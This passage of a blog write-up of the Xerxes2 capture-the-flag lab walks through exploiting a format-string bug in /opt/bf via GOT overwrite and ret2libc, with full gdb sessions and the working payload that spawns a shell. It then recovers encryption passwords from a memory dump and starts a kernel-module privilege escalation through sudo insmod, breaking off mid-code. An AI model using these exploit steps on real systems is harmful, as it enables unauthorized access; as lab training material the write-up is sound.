delacroix@xerxes2:~$ ldd /opt/bf
    linux-gate.so.1 =&amp;gt;  (0x4001e000)
    libc.so.6 =&amp;gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0x40026000)
    /lib/ld-linux.so.2 (0x40000000)
delacroix@xerxes2:~$ ldd /opt/bf
    linux-gate.so.1 =&amp;gt;  (0x4001e000)
    libc.so.6 =&amp;gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0x40026000)
    /lib/ld-linux.so.2 (0x40000000)
delacroix@xerxes2:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The memory locations are now static :) With that done, lets have a look at what pointer we would like to override, and then where we should be overwriting it to. We first take a look at the Global Offset Table:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;delacroix@xerxes2:~$ objdump -R /opt/bf

/opt/bf:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049a38 R_386_GLOB_DAT    __gmon_start__
08049a48 R_386_JUMP_SLOT   printf
08049a4c R_386_JUMP_SLOT   getchar
08049a50 R_386_JUMP_SLOT   __gmon_start__
08049a54 R_386_JUMP_SLOT   exit
08049a58 R_386_JUMP_SLOT   __libc_start_main
08049a5c R_386_JUMP_SLOT   memset
08049a60 R_386_JUMP_SLOT   putchar


delacroix@xerxes2:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here, we will choose to override the &lt;code&gt;printf&lt;/code&gt; functions pointer. This is at 0x08049a48. So, this address will have the location of our &lt;em&gt;evil code&lt;/em&gt;. But now, how do we know where the evil code is and &lt;em&gt;what&lt;/em&gt; is it? Again, this was another interesting thing that had me researching for a very long time. In the end, it came to light that there is such a thing as &lt;a href=&#34;http://protostar-solutions.googlecode.com/hg/Stack%206/ret2libc.pdf&#34;&gt;ret2libc&lt;/a&gt;. The basic idea here is that we override the pointer for &lt;code&gt;printf&lt;/code&gt; to &lt;code&gt;system&lt;/code&gt; with a argument. I highly recommend you read &lt;a href=&#34;http://protostar-solutions.googlecode.com/hg/Stack%206/ret2libc.pdf&#34;&gt;this pdf&lt;/a&gt; for a proper explanation on what exactly this means.&lt;/p&gt;

&lt;p&gt;The only thing that is left to determine is where &lt;code&gt;system&lt;/code&gt; is in memory. Luckily this is also pretty easy to find out. Fire up &lt;code&gt;gdb&lt;/code&gt;, run the binary and &lt;code&gt;print system&lt;/code&gt; to get the address:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;delacroix@xerxes2:~$ gdb -q /opt/bf
Reading symbols from /opt/bf...(no debugging symbols found)...done.
(gdb) run
Starting program: /opt/bf
usage: /opt/bf [program]
[Inferior 1 (process 11342) exited with code 0377]
(gdb) print system
$1 = {&amp;lt;text variable, no debug info&amp;gt;} 0x40062000 &amp;lt;system&amp;gt;
(gdb)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Soooo, 0x40062000. We have the point in memory where &lt;code&gt;system()&lt;/code&gt; lives, and we know where the program is going to go to lookup the &lt;code&gt;printf&lt;/code&gt; function. All that is left now is to exploit the format string vulnerability, override the location of &lt;code&gt;printf&lt;/code&gt; with &lt;code&gt;system&lt;/code&gt;, and provide a new argument for the now fooled &lt;code&gt;printf&lt;/code&gt; to run. A new argument can be given by simply providing another &lt;code&gt;#&lt;/code&gt; (remember we have the source so that was easy to figure out).&lt;/p&gt;

&lt;h3 id=&#34;opt-bf-part4&#34;&gt;/opt/bf - part4&lt;/h3&gt;

&lt;p&gt;We have all the information we need, lets get to work.&lt;/p&gt;

&lt;p&gt;We fire up &lt;code&gt;gdb&lt;/code&gt;, and instead of printing the location of &lt;code&gt;AAAA&lt;/code&gt;, we provide a memory address, with a &lt;code&gt;%n&lt;/code&gt; format string so that we can write the amount of bites needed to override the pointer location.&lt;/p&gt;

&lt;p&gt;To aid in getting the exact amount of padding right, we will set a breakpoint just before the application finished so that we can examine the pointer 0x08049a48 from the GOT:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;delacroix@xerxes2:~$ gdb -q /opt/bf
Reading symbols from /opt/bf...(no debugging symbols found)...done.

(gdb) disass main
Dump of assembler code for function main:
   0x08048684 &amp;lt;+0&amp;gt;: push   %ebp
   0x08048685 &amp;lt;+1&amp;gt;: mov    %esp,%ebp
   0x08048687 &amp;lt;+3&amp;gt;: and    $0xfffffff0,%esp
   0x0804868a &amp;lt;+6&amp;gt;: sub    $0x7540,%esp
   0x08048690 &amp;lt;+12&amp;gt;:    cmpl   $0x1,0x8(%ebp)
   0x08048694 &amp;lt;+16&amp;gt;:    jg     0x80486b7 &amp;lt;main+51&amp;gt;
   0x08048696 &amp;lt;+18&amp;gt;:    mov    0xc(%ebp),%eax
   0x08048699 &amp;lt;+21&amp;gt;:    mov    (%eax),%eax
   0x0804869b &amp;lt;+23&amp;gt;:    mov    %eax,0x4(%esp)
   0x0804869f &amp;lt;+27&amp;gt;:    movl   $0x804887c,(%esp)
   0x080486a6 &amp;lt;+34&amp;gt;:    call   0x8048390 &amp;lt;printf@plt&amp;gt;
   0x080486ab &amp;lt;+39&amp;gt;:    movl   $0xffffffff,(%esp)
   0x080486b2 &amp;lt;+46&amp;gt;:    call   0x80483c0 &amp;lt;exit@plt&amp;gt;
   0x080486b7 &amp;lt;+51&amp;gt;:    movl   $0x7530,0x8(%esp)
   0x080486bf &amp;lt;+59&amp;gt;:    movl   $0x0,0x4(%esp)
   0x080486c7 &amp;lt;+67&amp;gt;:    lea    0x10(%esp),%eax
   0x080486cb &amp;lt;+71&amp;gt;:    mov    %eax,(%esp)
   0x080486ce &amp;lt;+74&amp;gt;:    call   0x80483e0 &amp;lt;memset@plt&amp;gt;
   0x080486d3 &amp;lt;+79&amp;gt;:    mov    0xc(%ebp),%eax
   0x080486d6 &amp;lt;+82&amp;gt;:    add    $0x4,%eax
   0x080486d9 &amp;lt;+85&amp;gt;:    mov    (%eax),%eax
   0x080486db &amp;lt;+87&amp;gt;:    lea    0x10(%esp),%edx
   0x080486df &amp;lt;+91&amp;gt;:    mov    %edx,0x4(%esp)
   0x080486e3 &amp;lt;+95&amp;gt;:    mov    %eax,(%esp)
   0x080486e6 &amp;lt;+98&amp;gt;:    call   0x80484ec &amp;lt;bf&amp;gt;
   0x080486eb &amp;lt;+103&amp;gt;:   movl   $0x0,(%esp) # &amp;lt;-- we will break here
   0x080486f2 &amp;lt;+110&amp;gt;:   call   0x80483c0 &amp;lt;exit@plt&amp;gt;
End of assembler dump.

(gdb) break *0x080486eb
Breakpoint 1 at 0x80486eb

(gdb) run &amp;quot;$(python -c &#39;print &amp;quot;&amp;gt;&amp;quot;.join([&amp;quot;+&amp;quot; * ord(x) for x in (&amp;quot;\x48\x9a\x04\x08&amp;quot; + &amp;quot;%16$n&amp;quot;)])&#39;)#&amp;quot;
Starting program: /opt/bf &amp;quot;$(python -c &#39;print &amp;quot;&amp;gt;&amp;quot;.join([&amp;quot;+&amp;quot; * ord(x) for x in (&amp;quot;\x48\x9a\x04\x08&amp;quot; + &amp;quot;%16$n&amp;quot;)])&#39;)#&amp;quot;

Breakpoint 1, 0x080486eb in main ()

(gdb) x/x 0x08049a48
0x8049a48 &amp;lt;printf@got.plt&amp;gt;: 0x00000004
(gdb)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Oooooooooooh. So basically 0x8049a48 now says &lt;code&gt;printf&lt;/code&gt; lives at 0x00000004. Not entirely true though, but we will fix this. Fixing this is quite easy too. Using some python again, we can calculate the amount of bytes we must write to get the memory location we want. We know we want to write to &lt;code&gt;system&lt;/code&gt;, that lives in memory at 0x40062000. We will split the calculation up into 2 parts, and first write the 0x2000, and then the 0x4006. We can see that we have written 4 bytes already, so to calculate the first part, we will simply subtract 4 from 0x2000 and pad parameter 16 with the amount.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;(gdb) shell echo $(python -c &#39;print 0x2000-0x4&#39;)
8188 # output is a decimal value
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We now pad the format string as required, re-run the program in &lt;code&gt;gdb&lt;/code&gt;, and inspect 0x08049a48 from the GOT&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;(gdb) run &amp;quot;$(python -c &#39;print &amp;quot;&amp;gt;&amp;quot;.join([&amp;quot;+&amp;quot; * ord(x) for x in (&amp;quot;\x48\x9a\x04\x08&amp;quot; + &amp;quot;%8188u%16$n&amp;quot;)])&#39;)#&amp;quot;
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /opt/bf &amp;quot;$(python -c &#39;print &amp;quot;&amp;gt;&amp;quot;.join([&amp;quot;+&amp;quot; * ord(x) for x in (&amp;quot;\x48\x9a\x04\x08&amp;quot; + &amp;quot;%8188u%16$n&amp;quot;)])&#39;)#&amp;quot;
H�
Breakpoint 1, 0x080486eb in main ()
(gdb) x/x 0x08049a48
0x8049a48 &amp;lt;printf@got.plt&amp;gt;: 0x00002000
(gdb)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You will see some whitespace output as a result of the &lt;code&gt;%8188u&lt;/code&gt;, but inspecting the pointer from GOT reveals that we have the lower part of the memory now set correctly (0x00002000)! :) The upper part of the address is calculated in a similar way, however, we are going to be moving on 2 places in memory to write this value and provide another format string. This means that our lower part of the memory will change as a result, and we will need to compensate for that when we calculate the upper part.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;(gdb) run &amp;quot;$(python -c &#39;print &amp;quot;&amp;gt;&amp;quot;.join([&amp;quot;+&amp;quot; * ord(x) for x in (&amp;quot;\x48\x9a\x04\x08&amp;quot; + &amp;quot;\x4a\x9a\x04\x08&amp;quot; + &amp;quot;%8188u%16$n&amp;quot; + &amp;quot;%17$n&amp;quot;)])&#39;)#&amp;quot;
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /opt/bf &amp;quot;$(python -c &#39;print &amp;quot;&amp;gt;&amp;quot;.join([&amp;quot;+&amp;quot; * ord(x) for x in (&amp;quot;\x48\x9a\x04\x08&amp;quot; + &amp;quot;\x4a\x9a\x04\x08&amp;quot; + &amp;quot;%8188u%16$n&amp;quot; + &amp;quot;%17$n&amp;quot;)])&#39;)#&amp;quot;
H�J�                                                                                                                                                                                                              3
Breakpoint 1, 0x080486eb in main ()
(gdb) x/x 0x08049a48
0x8049a48 &amp;lt;printf@got.plt&amp;gt;: 0x20042004
(gdb)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As you can see, we have moved up 4 bytes on the lower part of the address, so we can simply take 4 off 8188 to fix that. To determine the upper part of the address though, we will do another hex calculation and remove the amount that we have from the amount that we want:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;(gdb) shell echo $(python -c &#39;print 0x4006-0x2000&#39;)
8198 # output is a decimal value

(gdb) run &amp;quot;$(python -c &#39;print &amp;quot;&amp;gt;&amp;quot;.join([&amp;quot;+&amp;quot; * ord(x) for x in (&amp;quot;\x48\x9a\x04\x08&amp;quot; + &amp;quot;\x4a\x9a\x04\x08&amp;quot; + &amp;quot;%8184u%16$n&amp;quot; + &amp;quot;%8198u%17$n&amp;quot;)])&#39;)#&amp;quot;
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /opt/bf &amp;quot;$(python -c &#39;print &amp;quot;&amp;gt;&amp;quot;.join([&amp;quot;+&amp;quot; * ord(x) for x in (&amp;quot;\x48\x9a\x04\x08&amp;quot; + &amp;quot;\x4a\x9a\x04\x08&amp;quot; + &amp;quot;%8184u%16$n&amp;quot; + &amp;quot;%8198u%17$n&amp;quot;)])&#39;)#&amp;quot;
H�J�
Breakpoint 1, 0x080486eb in main ()
(gdb) x/x 0x08049a48
0x8049a48 &amp;lt;printf@got.plt&amp;gt;: 0x40062000
(gdb)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;w00t. We have rewritten the GOT for &lt;code&gt;printf&lt;/code&gt; to the location of the libc &lt;code&gt;system&lt;/code&gt; call using the format string vulnerability. Phew.&lt;/p&gt;

&lt;h3 id=&#34;opt-bf-part5&#34;&gt;/opt/bf - part5&lt;/h3&gt;

&lt;p&gt;Now, all that is left is to get the &lt;code&gt;printf&lt;/code&gt; to rerun (using the &lt;code&gt;#&lt;/code&gt;) with a payload such as &lt;code&gt;/bin/sh&lt;/code&gt;. We will append the &lt;code&gt;/bin/sh&lt;/code&gt; to the end and just add another &lt;code&gt;#&lt;/code&gt; to call &lt;code&gt;printf&lt;/code&gt; (which is now overridden):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;delacroix@xerxes2:~$ /opt/bf &amp;quot;$(python -c &#39;print &amp;quot;&amp;gt;&amp;quot;.join([&amp;quot;+&amp;quot; * ord(x) for x in (&amp;quot;\x48\x9a\x04\x08&amp;quot; + &amp;quot;\x4a\x9a\x04\x08&amp;quot; + &amp;quot;%8184u%16$n&amp;quot; + &amp;quot;%8198u%17$n&amp;quot; + &amp;quot;;/bin/sh&amp;quot;)])&#39;)##&amp;quot;
H�J�                                                                                                                                                                                                              d
$ id
uid=1002(delacroix) gid=1002(delacroix) euid=1001(polito) egid=1001(polito) groups=1001(polito),1002(delacroix)
$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Oly. Crap. That. Was. Awesome. :D :D&lt;/p&gt;

&lt;p&gt;We have just exploited a format string vulnerability on a binary that has the NX bit set, encoded with brainfk using ret2libc.&lt;/p&gt;

&lt;h2 id=&#34;becoming-korenchkin&#34;&gt;becoming korenchkin&lt;/h2&gt;

&lt;p&gt;We just got a shell with a euid for &lt;code&gt;polito&lt;/code&gt;. To make life easier, I copied the public key I generated earlier for the first shell into &lt;code&gt;polito&lt;/code&gt;&amp;rsquo;s home, and SSH&amp;rsquo;d in as that user.&lt;/p&gt;

&lt;p&gt;At first glance, it appeared as if we have a gpg encrypted &lt;code&gt;dump&lt;/code&gt; and a pdf. There was also a cronjob to start a netcat server piping a text file out via tcp/4444 (remember the mp3 form earlier? :D)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;polito@xerxes2:~$ ls -lh
total 43M
-rw-r--r-- 1 polito polito 140K Jul 16 10:57 audio.txt
-rw-r--r-- 1 polito polito  43M Jul 16 12:17 dump.gpg
-rw-r--r-- 1 polito polito  27K Jul 16 12:19 polito.pdf
polito@xerxes2:~$ crontab -l
[...]
@reboot while true ; do nc -l -p 4444 &amp;lt; /home/polito/audio.txt ; done
polito@xerxes2:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There was not much I could do with the &lt;code&gt;dump.gpg&lt;/code&gt; yet, so I decided to open up the pdf in a pdf viewer:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/xerxesII_polito_pdf.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;That is all the PDF had. The QR code resolves to &amp;ldquo;XERXES is watching&amp;hellip;&amp;rdquo;. I tried to highlight all of the text in the PDF to maybe reveal a piece of text that was white in color, but nothing apparent came out. The next step was to run the PDF through the &lt;code&gt;file&lt;/code&gt; utility.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;polito@xerxes2:~$ file -k polito.pdf
polito.pdf: x86 boot sector, code offset 0xe0 DBase 3 data file with memo(s) (1146103071 records)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&amp;hellip;&lt;em&gt;x86 boot sector&lt;/em&gt;&amp;hellip; wait&amp;hellip; &lt;strong&gt;WHAT&lt;/strong&gt;?. Ok, so that is interesting. Opening the PDF in a HEX editor revealed 2 PDF headers:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;00000000  83 E0 FF EB  1F 25 50 44   46 2D 31 2E  35 0A 39 39 .....%PDF-1.5.99
00000010  39 20 30 20  6F 62 6A 0A   3C 3C 3E 3E  0A 73 74 72 9 0 obj.&amp;lt;&amp;lt;&amp;gt;&amp;gt;.str
00000020  65 61 6D 0A  68 E0 08 17   BC 00 10 68  C0 07 1F EB eam.h......h....
00000030  21 59 81 F9  4D 5A 74 0C   B4 0E 86 C1  CD 10 86 C5 !Y..MZt.........
00000040  CD 10 EB ED  BE 55 00 AC   75 02 EB FE  B4 0E CD 10 .....U..u.......
00000050  EB F5 EB 72  E9 2D 2D 57   41 52 4E 49  4E 47 2D 2D ...r.--WARNING--
00000060  0A 20 20 20  55 6E 61 75   74 68 6F 72  69 7A 65 64 .   Unauthorized
00000070  20 66 69 6C  65 20 61 63   63 65 73 73  20 77 69 6C file access wil
00000080  6C 20 62 65  20 72 65 70   6F 72 74 65  64 2E 0A 20 l be reported..
00000090  20 20 20 20  58 45 52 58   45 53 20 77  69 73 68 65 XERXES wishe
000000A0  73 20 79 6F  75 0A 20 20   20 20 20 20  20 20 20 20 s you.
000000B0  61 20 6D 6F  73 74 20 70   72 6F 64 75  63 74 69 76 a most productiv
000000C0  65 20 64 61  79 00 68 6F   77 68 59 58  68 0D 0A 68 e day.howhYXh..h
000000D0  37 69 68 68  7A 68 4F 77   68 34 35 68  0A 40 68 67 7ihhzhOwh45h.@hg
000000E0  49 68 20 2C  68 23 6F 68   4D 5A 68 0A  0A 68 4E 6C Ih ,h#ohMZh..hNl
000000F0  68 61 57 68  46 75 68 61   6D 68 0A 20  68 3A 20 68 haWhFuhamh. h: h
00000100  69 73 68 64  20 68 6F 72   68 73 77 68  61 73 68 20 ishd horhswhash
00000110  70 68 68 65  68 0A 54 E9   17 FF 00 00  00 00 00 00 phheh.T.........
00000120  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
00000130  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
00000140  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
00000150  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
00000160  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
00000170  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
00000180  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
00000190  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
000001A0  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
000001B0  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
000001C0  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
000001D0  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
000001E0  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
000001F0  00 00 00 00  00 00 00 00   00 00 00 00  00 00 55 AA ..............U.
00000200  25 50 44 46  2D 31 2E 35   0A 25 D0 D4  C5 D8 0A 34 %PDF-1.5.%.....4
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Notice the 2 &lt;code&gt;%PDF-1.5&lt;/code&gt;. Assuming this really was a MBR, I decided to strip the first 512 bytes and put that in a new file. Then, the remainder of the bytes to a second file, and test by attempting to open both in a PDF viewer again.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# head -c 512 polito.pdf &amp;gt; first
root@kali:~# file -k first
first: x86 boot sector, code offset 0xe0 DBase 3 data file with memo(s) (1146103071 records)

root@kali:~# tail -c +512 polito.pdf &amp;gt; second
root@kali:~# file second
second: Dyalog APL
root@kali:~#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Opening &lt;code&gt;first&lt;/code&gt; in a PDF viewer gave a blank PDF, and &lt;code&gt;second&lt;/code&gt; gave the PDF we saw originally with &lt;code&gt;polito.pdf&lt;/code&gt;. &lt;code&gt;first&lt;/code&gt; was still seen as as x86 boot sector file. I searched furiously for way to analyze bootsector code, learned about the &lt;a href=&#34;http://en.wikipedia.org/wiki/Master_boot_record#Sector_layout&#34;&gt;structure&lt;/a&gt; etc. Eventually it was time to take a break and come back with a fresh look at this.&lt;/p&gt;

&lt;p&gt;I came back with some new ideas. One of them being that I should quickly create a VM, attach &lt;code&gt;first&lt;/code&gt; as a disk and try run it and see what the output would be. VirtualBox did not like the file format of &lt;code&gt;first&lt;/code&gt; :( Next I resorted to using &lt;code&gt;qemu&lt;/code&gt;. And success!&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/xerxesII_qemu_boot.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Running &lt;code&gt;$ qemu first&lt;/code&gt;, booted a vm and ran the bootsector code, revealing a password of &lt;em&gt;amFuaWNl&lt;/em&gt;. The next part was pretty easy. I assumed this was the password word for the potentially GPG encrypted &lt;code&gt;dump&lt;/code&gt; file:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;polito@xerxes2:~$ gpg -d dump.gpg &amp;gt; decrypted_dump
gpg: CAST5 encrypted data
gpg: encrypted with 1 passphrase
gpg: WARNING: message was not integrity protected

polito@xerxes2:~$ file decrypted_dump
decrypted_dump: data

polito@xerxes2:~$ ls -lh decrypted_dump
-rw-r--r-- 1 polito polito 126M Aug 10 02:12 decrypted_dump
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So we successfully decrypted &lt;code&gt;dump.gpg&lt;/code&gt; it seems resulting in a 126M file, however at first glance it appears to just be junk. I paged and paged and paged and paged and paged through &lt;code&gt;less&lt;/code&gt; until I saw cleartext that looked like kernel boot messages. The first thought that came to mind after seeing this was &amp;ldquo;Could this be some sort of memory dump?&amp;rdquo;.&lt;/p&gt;

&lt;p&gt;As the kernel messages were interesting, I decided to put the decrypted dump through strings. Eventually after going through even more pages, it seemed like there were even some command history in the dump. Ok, well then I believe its time to look for things that could relate to that file in &lt;code&gt;/opt/backup&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;polito@xerxes2:~$ grep $(ls /opt/backup/) decrypted_strings
korenchkin.tar.enc
openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc
openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc
openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc
polito@xerxes2:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Heh, ok. Easy enough. &lt;code&gt;korenchkin.tar.enc&lt;/code&gt; was encrypted using &lt;code&gt;openssl&lt;/code&gt;. We can simply decrypt this with the &lt;code&gt;-d&lt;/code&gt; flag. From the dump we were able to get the password used too:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;polito@xerxes2:~$ openssl enc -d -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar.enc -out ~/korenchkin.tar

polito@xerxes2:~$ file korenchkin.tar
korenchkin.tar: POSIX tar archive (GNU)

polito@xerxes2:~$ tar xvf korenchkin.tar
.ssh/id_rsa
.ssh/id_rsa.pub
polito@xerxes2:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Extracting &lt;code&gt;korenchkin.tar&lt;/code&gt; revealed a SSH key pair, so to become korenchkin I copied the SSH key to my Kali VM and SSH in as &lt;code&gt;korenchkin&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# ssh -i korenchkin.key korenchkin@192.168.56.102

Welcome to xerxes2.
      XERXES wishes you
       a pleasant stay.
____   ___  ____  ___  __ ____   ___  ____     ____     ____
`MM(   )P&#39; 6MMMMb `MM 6MM `MM(   )P&#39; 6MMMMb   6MMMMb\  6MMMMb
 `MM` ,P  6M&#39;  `Mb MM69 &amp;quot;  `MM` ,P  6M&#39;  `Mb MM&#39;    ` MM&#39;  `Mb
  `MM,P   MM    MM MM&#39;      `MM,P   MM    MM YM.           ,MM
   `MM.   MMMMMMMM MM        `MM.   MMMMMMMM  YMMMMb      ,MM&#39;
   d`MM.  MM       MM        d`MM.  MM            `Mb   ,M&#39;
  d&#39; `MM. YM    d9 MM       d&#39; `MM. YM    d9 L    ,MM ,M&#39;
_d_  _)MM_ YMMMM9 _MM_    _d_  _)MM_ YMMMM9  MYMMMM9  MMMMMMMM

You have new mail.
korenchkin@xerxes2:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;em&gt;You have new mail.&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&#34;becoming-root&#34;&gt;becoming root&lt;/h2&gt;

&lt;p&gt;Again, enumeration is key. As &lt;code&gt;korenchkin&lt;/code&gt;, you will see that you may run.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;korenchkin@xerxes2:~$ sudo -l
Matching Defaults entries for korenchkin on this host:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User korenchkin may run the following commands on this host:
    (root) NOPASSWD: /sbin/insmod, (root) /sbin/rmmod
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So we may run insmod as &lt;code&gt;root&lt;/code&gt;. Immediately this hints towards the fact that we will need to write a custom kernel module and maybe spawn a shell? And so, we board another educational school bus ride towards kernel module land.&lt;/p&gt;

&lt;p&gt;I confirmed that the kernel-headers were installed for the current kernel. Googling around got me to a sample &amp;ldquo;Hello World!&amp;rdquo; kernel module. This together with a sample &lt;code&gt;Makefile&lt;/code&gt; was working fine. The sources for the files initially tested were:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;linux/module.h&amp;gt;       /* Needed by all modules */
#include &amp;lt;linux/kernel.h&amp;gt;       /* Needed for KERN_INFO */
#include &amp;lt;linux/init.h&amp;gt;         /* Needed for the macros */

static int __init hello_start(void)
{
    printk(KERN_INFO &amp;quot;Loading hello module...\n&amp;quot;);
    return 0;
}

static void __exit hello_end(void)
{
    printk(KERN_INFO &amp;quot;Goodbye Mr.\n&amp;quot;);
}

module_init(hello_start);
module_exit(hello_end);
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-make&#34;&gt;obj-m += hello.o

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I took &lt;code&gt;hello.c&lt;/code&gt; and the &lt;code&gt;Makefile&lt;/code&gt;, put them into a directory, built the module with &lt;code&gt;make&lt;/code&gt;, and loaded it. Once the module loaded I checked the kernel messages via &lt;code&gt;dmesg&lt;/code&gt; to confirm it working:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;korenchkin@xerxes2:~/kern$ make
make -C /lib/modules/3.2.0-4-686-pae/build M=/home/korenchkin/kern modules
make[1]: Entering directory `/usr/src/linux-headers-3.2.0-4-686-pae&#39;
  CC [M]  /home/korenchkin/kern/hello.o
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /home/korenchkin/kern/hello.mod.o
  LD [M]  /home/korenchkin/kern/hello.ko
make[1]: Leaving directory `/usr/src/linux-headers-3.2.0-4-686-pae&#39;

korenchkin@xerxes2:~/kern$ sudo insmod hello.ko

korenchkin@xerxes2:~/kern$ dmesg | tail
[...]
[68192.983366] hello: module license &#39;unspecified&#39; taints kernel.
[68192.983369] Disabling lock debugging due to kernel taint
[68192.983637] Loading hello module...
korenchkin@xerxes2:~/kern$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Alrighty, that was, easy! However, this is not really useful. I want command execution! So, what did I do? &lt;code&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/code&gt;, and &lt;code&gt;system()&lt;/code&gt; some commands to run &lt;code&gt;stuff&lt;/code&gt;, getting me a &lt;code&gt;/tmp/getroot&lt;/code&gt; prepared.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;insert loud crash and burn sound here&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Turns out, kernel development is pretty anti command execution. Compiling modules that have stuff like &lt;code&gt;stdio.h&lt;/code&gt; included will fail with headers not found type errors. One can hack the Makefile to include headers from &lt;code&gt;/usr/include&lt;/code&gt;, but it just ends up being a mess. However, there is a handy little function in &lt;code&gt;kmod.h&lt;/code&gt; called &lt;code&gt;call_usermodehelper()&lt;/code&gt;. From the &lt;a href=&#34;https://www.kernel.org/doc/htmldocs/kernel-api/API-call-usermodehelper.html&#34;&gt;kernel docs&lt;/a&gt;, &lt;code&gt;call_usermodehelper()&lt;/code&gt; will &lt;em&gt;prepare and start a usermode application&lt;/em&gt;. &lt;strong&gt;That&lt;/strong&gt; sounds pretty handy in our case :)&lt;/p&gt;

&lt;p&gt;So, time to rewrite &lt;code&gt;hello.c&lt;/code&gt; to be useful! Puzzling the pieces together I found on the internet, &lt;a href=&#34;http://stackoverflow.com/questions/7143105/call-usermodehelper-call-usermodehelperpipe-usage&#34;&gt;this&lt;/a&gt; amongst other pieces of information helped get the ball rolling.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#include &amp;lt;linux/module.h&amp;gt;       /* Needed by all modules */
#include &amp;lt;linux/kernel.h&amp;gt;       /* Needed for KERN_INFO */
#include &amp;lt;linux/init.h&amp;gt;         /* Needed for the macros */

/* For our shell ^_^ */
#include&amp;lt;linux/kmod.h&amp;gt;

int get_root (void)
{

